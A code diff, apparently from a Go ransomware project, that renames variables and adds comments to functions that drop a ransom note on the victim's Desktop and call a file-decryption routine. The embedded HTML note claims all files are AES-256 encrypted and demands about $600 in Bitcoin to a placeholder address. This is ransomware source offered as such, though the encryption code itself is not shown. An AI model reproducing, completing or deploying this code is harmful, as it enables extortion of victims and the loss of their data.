@@ -5,22 +5,25 @@ import (
 	"os"
 )
 
-var PRICE = 600
+var price = 600
 
+// End decrypts documets and exits
 func End() {
 	//Decrypt
 	EncryptDocumets("/", false)
 	os.Exit(0)
 }
+
+// PromtPay add note to desktop
 func PromtPay() {
 	/*
 	*	Copy instructions to Desktop and opens it
 	 */
-	ioutil.WriteFile(os.Getenv("HOME")+string(os.PathSeparator)+"Desktop"+string(os.PathSeparator)+"Instructions.html", []byte(TEXT), 0644)
+	ioutil.WriteFile(os.Getenv("HOME")+string(os.PathSeparator)+"Desktop"+string(os.PathSeparator)+"Instructions.html", []byte(text), 0644)
 
 }
 
-var TEXT = `<p><center><h1>ALL YOUR FILES HAS BEEN ENCRYPTED</br></h1></center></p>
+var text = `<p><center><h1>ALL YOUR FILES HAS BEEN ENCRYPTED</br></h1></center></p>
 
 <p>All your files have been encrypted using AES 256, there
 is no way to detrypt them by yourself.</p>
@@ -28,7 +31,7 @@ is no way to detrypt them by yourself.</p>
 <p>If you want to decrypt them you have to pay aproximatly <b>600$</b> in Bitcoins<br>
 to the following address:</p>
 
-<p>Amount: <b>` + string(PRICE) + ` BTCs</b><br>
+<p>Amount: <b>` + string(price) + ` BTCs</b><br>
 To the address: <b>` + BTC_ADDRESS + `</b></p>
 
 <p>Do not worry if you don't know what bitcoins are, they are an online currency<br>
